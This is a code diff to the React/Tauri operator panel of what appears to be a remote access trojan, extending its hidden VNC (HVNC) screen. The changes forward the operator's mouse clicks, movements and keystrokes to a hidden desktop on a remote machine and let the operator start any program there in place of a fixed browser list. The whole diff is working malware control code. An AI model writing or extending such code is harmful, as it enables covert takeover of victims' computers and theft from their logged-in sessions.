@@ -1,7 +1,7 @@
 import { useEffect, useState, useRef } from "react";
 import { useParams } from "react-router-dom";
 import { listen } from "@tauri-apps/api/event";
-import { manageHVNC } from "../rat/RATCommands";
+import { manageHVNC, sendHVNCMouseClick, sendHVNCKeyboardInput } from "../rat/RATCommands";
 import {
   IconAdjustmentsAlt,
   IconInfoCircle,
@@ -76,7 +76,7 @@ export const HVNC = () => {
     setConnectionStatus("Connecting...");
 
     try {
-      await manageHVNC(addr, "start");
+      await manageHVNC(addr, "start", 70, 5);
       setIsConnected(true);
     } catch (error) {
       console.error("Failed to start HVNC:", error);
@@ -98,12 +98,8 @@ export const HVNC = () => {
     try {
       if (selectedAction === "explorer.exe") {
         await manageHVNC(addr, "open_explorer");
-      } else if (selectedAction === "chrome.exe") {
-        await manageHVNC(addr, "open_chrome");
-      } else if (selectedAction === "firefox.exe") {
-        await manageHVNC(addr, "open_firefox");
-      } else if (selectedAction === "edge.exe") {
-        await manageHVNC(addr, "open_edge");
+      } else {
+        await manageHVNC(addr, "start_process", undefined, undefined, selectedAction);
       }
     } catch (error) {
       console.error(`Failed to open ${selectedAction}:`, error);
@@ -142,6 +138,70 @@ export const HVNC = () => {
       </div>
     );
   }
+
+  const handleMouseDown = (e: React.MouseEvent<HTMLCanvasElement>) => {
+    if (!addr || !isConnected) return;
+    const canvas = canvasRef.current;
+    if (!canvas) return;
+
+    const rect = canvas.getBoundingClientRect();
+    const x = Math.round((e.clientX - rect.left) * (canvas.width / rect.width));
+    const y = Math.round((e.clientY - rect.top) * (canvas.height / rect.height));
+
+    sendHVNCMouseClick(addr, x, y, e.button === 0 ? 0 : 2, 1, 0);
+  };
+
+  const handleMouseUp = (e: React.MouseEvent<HTMLCanvasElement>) => {
+    if (!addr || !isConnected) return;
+    const canvas = canvasRef.current;
+    if (!canvas) return;
+
+    const rect = canvas.getBoundingClientRect();
+    const x = Math.round((e.clientX - rect.left) * (canvas.width / rect.width));
+    const y = Math.round((e.clientY - rect.top) * (canvas.height / rect.height));
+
+    sendHVNCMouseClick(addr, x, y, e.button === 0 ? 0 : 2, 2, 0);
+  };
+
+  const handleMouseMove = (e: React.MouseEvent<HTMLCanvasElement>) => {
+    if (!addr || !isConnected) return;
+    const canvas = canvasRef.current;
+    if (!canvas) return;
+
+    const rect = canvas.getBoundingClientRect();
+    const x = Math.round((e.clientX - rect.left) * (canvas.width / rect.width));
+    const y = Math.round((e.clientY - rect.top) * (canvas.height / rect.height));
+
+    sendHVNCMouseClick(addr, x, y, 0, 3, 0);
+  };
+
+  const handleKeyDown = (e: React.KeyboardEvent<HTMLCanvasElement>) => {
+    if (!addr || !isConnected) return;
+    e.preventDefault();
+    sendHVNCKeyboardInput(
+      addr,
+      e.keyCode,
+      e.key.length === 1 ? e.key : "",
+      true,
+      e.shiftKey,
+      e.ctrlKey,
+      false
+    );
+  };
+
+  const handleKeyUp = (e: React.KeyboardEvent<HTMLCanvasElement>) => {
+    if (!addr || !isConnected) return;
+    e.preventDefault();
+    sendHVNCKeyboardInput(
+      addr,
+      e.keyCode,
+      e.key.length === 1 ? e.key : "",
+      false,
+      e.shiftKey,
+      e.ctrlKey,
+      false
+    );
+  };
 
   return (
     <div className="relative w-screen h-screen bg-black flex flex-col items-center p-0 m-0">
@@ -281,8 +341,14 @@ export const HVNC = () => {
         ) : (
           <canvas
             ref={canvasRef}
-            className="max-h-full max-w-full"
+            className="max-h-full max-w-full cursor-crosshair"
             tabIndex={0}
+            onMouseDown={handleMouseDown}
+            onMouseUp={handleMouseUp}
+            onMouseMove={handleMouseMove}
+            onKeyDown={handleKeyDown}
+            onKeyUp={handleKeyUp}
+            onContextMenu={(e) => e.preventDefault()}
           />
         )}
       </div>
